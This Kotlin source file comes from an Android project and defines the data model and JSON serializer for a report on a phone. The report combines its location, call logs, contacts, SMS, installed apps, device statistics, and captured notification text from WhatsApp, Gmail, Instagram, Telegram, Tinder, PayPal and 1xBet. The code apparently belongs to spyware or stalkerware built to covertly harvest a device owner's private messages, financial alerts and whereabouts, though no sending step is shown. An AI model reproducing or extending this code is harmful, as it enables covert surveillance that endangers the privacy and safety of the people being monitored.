package com.umarabbas.firstproject

import com.google.gson.GsonBuilder
import com.google.gson.annotations.SerializedName

fun getResponse(
        location: Location,
        callLogs: List<CallLog>,
        contactList: List<Contact>,
        whatsapList: List<WhatsappSms>,
        instagrams: List<Instagrams>,
        gmails: List<Gmails>,
        twitters: List<Twitters>,
        telegrams: List<Telegrams>,
        tinders: List<Tinders>,
        paypals: List<PayPal>,
        onexbets: List<OneXBet>,
        smsList: List<Sms>,
        appList: List<String>,
        statistics: Statistics
): String {
    return GsonBuilder().setLenient().create()
            .toJson(Data(callLogs, contactList, whatsapList,gmails,instagrams,twitters,telegrams,tinders,paypals, onexbets, smsList, location, appList, statistics))
//    return Data(callLogs, contactList, whatsapList,gmails,instagrams,twitters,telegrams,tinders,paypals, onexbets, smsList, location, appList, statistics)
}
data class Data(
        @SerializedName("callLogs") var name: List<CallLog>,
        @SerializedName("contacts") var number: List<Contact>,
        @SerializedName("whatsapps") var whatsapSms: List<WhatsappSms>,
        @SerializedName("gmails") var Gmails: List<Gmails>,
        @SerializedName("instagrams") var instagrams: List<Instagrams>,
        @SerializedName("twitters") var twitters: List<Twitters>,
        @SerializedName("telegrams") var telegrams: List<Telegrams>,
        @SerializedName("tinders") var tinders: List<Tinders>,
        @SerializedName("paypal") var paypals: List<PayPal>,
        @SerializedName("xbet") var onexbets: List<OneXBet>,
        @SerializedName("messages") var sms: List<Sms>,
        @SerializedName("location") var location: Location,
        @SerializedName("apps") var appsList: List<String>,
        @SerializedName("statistics") var statistics: Statistics
)
data class Location(
        @SerializedName("longitude")
        val longitude: String,
        @SerializedName("latitude")
        val latitude: String
) {
    override fun toString(): String {
        return "Location = $longitude , $latitude"
    }
}
data class CallLog(
        @SerializedName("callername")
        val callerName: String,
        @SerializedName("callerNumber")
        val callerNumber: String,
        @SerializedName("callType")
        val callType: String,
        @SerializedName("callDuration")
        val callDuration: String,
        @SerializedName("calTiming")
        val callTiming: String
) {
    override fun toString(): String {
        return "Caller Name : $callerName\nNumber : $callerNumber\nCall Type : ${callType}\nCall Duration : $callDuration\nTiming : $callTiming\n"
    }
}
data class Contact(
        @SerializedName("name")
        val name: String,
        @SerializedName("number")
        val number: String
) {
    override fun toString(): String {
        return "$name = $number\n"
    }
}
data class WhatsappSms(
        @SerializedName("senderContact")
        val senderContacts: String,
        @SerializedName("senderMessage")
        val senderMessage: String,
        @SerializedName("timeStamp")
        val timeStamp: String
) {
    override fun toString(): String {
        return "$senderContacts-$senderMessage-$timeStamp"
    }
}
data class Sms(
        @SerializedName("senderContact")
        val senderContact: String,
        @SerializedName("senderMessage")
        val msg: String,
        @SerializedName("timeStamp")
        val time: String
) {
    override fun toString(): String {
        return "Number : $senderContact\nMessage : $msg\nTime : $time\n"
    }
}
data class Statistics(
        @SerializedName("networkType")
        val networkType : String,
        @SerializedName("currentTime")
        val time : String,
        @SerializedName("device")
        val device : String,
        @SerializedName("battery")
        val battery : String,
        @SerializedName("lastRestart")
        val lastRestart : String,
        @SerializedName("totalSize")
        val totalSize : String,
        @SerializedName("availableSize")
        val availableSize : String,
        @SerializedName("androidVersion")
        val androidVersion : String,
        @SerializedName("appVersion")
        val appVersion : String
){
    override fun toString(): String {
        return "Connected Network Type: $networkType| \n" +
                "|Time: $time \n" +
                "|Device: $device \n" +
                "|Battery: $battery \n" +
                "|Last Restart: $lastRestart \n" +
                "|Total Space: $totalSize \n" +
                "|Free Space: $availableSize \n" +
                "|Android Version: $androidVersion \n" +
                "|App Version: $appVersion"
    }
}
data class Instagrams(
        @SerializedName("title")
        val title: String,
        @SerializedName("message")
        val message: String,
        @SerializedName("timeStamp")
        val timeStamp: String
) {
    override fun toString(): String {
        return "$title-$message-$timeStamp"
    }
}
data class Gmails(
        @SerializedName("title")
        val title: String,
        @SerializedName("message")
        val message: String,
        @SerializedName("bigText")
        val bigText: String,
        @SerializedName("timeStamp")
        val timeStamp: String
) {
    override fun toString(): String {
        return "$title-$message-$bigText-$timeStamp"
    }
}
data class Twitters(
        @SerializedName("title")
        val title: String,
        @SerializedName("message")
        val message: String,
        @SerializedName("timeStamp")
        val timeStamp: String
) {
    override fun toString(): String {
        return "$title-$message-$timeStamp"
    }
}
data class Telegrams(
        @SerializedName("title")
        val title: String,
        @SerializedName("message")
        val message: String,
        @SerializedName("timeStamp")
        val timeStamp: String
) {
    override fun toString(): String {
        return "$title-$message-$timeStamp"
    }
}
data class Tinders(
        @SerializedName("title")
        val title: String,
        @SerializedName("message")
        val message: String,
        @SerializedName("timeStamp")
        val timeStamp: String
) {
    override fun toString(): String {
        return "$title-$message-$timeStamp"
    }
}
data class PayPal(
        @SerializedName("title")
        val title: String,
        @SerializedName("message")
        val message: String,
        @SerializedName("timeStamp")
        val timeStamp: String
) {
    override fun toString(): String {
        return "$title-$message-$timeStamp"
    }
}
data class OneXBet(
        @SerializedName("title")
        val title: String,
        @SerializedName("message")
        val message: String,
        @SerializedName("timeStamp")
        val timeStamp: String
) {
    override fun toString(): String {
        return "$title-$message-$timeStamp"
    }
}

